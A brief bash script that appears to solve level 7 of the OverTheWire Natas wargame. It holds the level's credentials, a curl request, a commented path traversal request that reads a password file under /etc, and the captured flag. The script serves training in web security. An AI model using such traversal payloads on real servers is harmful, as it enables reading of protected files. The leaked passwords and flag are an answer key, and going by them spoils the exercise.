#!/bin/bash

 Username="natas7"
 Password="bmg8SvU1LizuWjx3y7xkNERkHxGre0GS"

# URL:
curl -s -u $Username:$Password http://natas7.natas.labs.overthewire.org

# Code:
# path traversal attack
# curl -s -u $Username:$Password http://natas7.natas.labs.overthewire.org/index.php?page=../../../../../etc/natas_webpass/natas9

# Flag:
# xcoXLmzMkoIP9D7hlgPlh9XD7OgLAe5Q
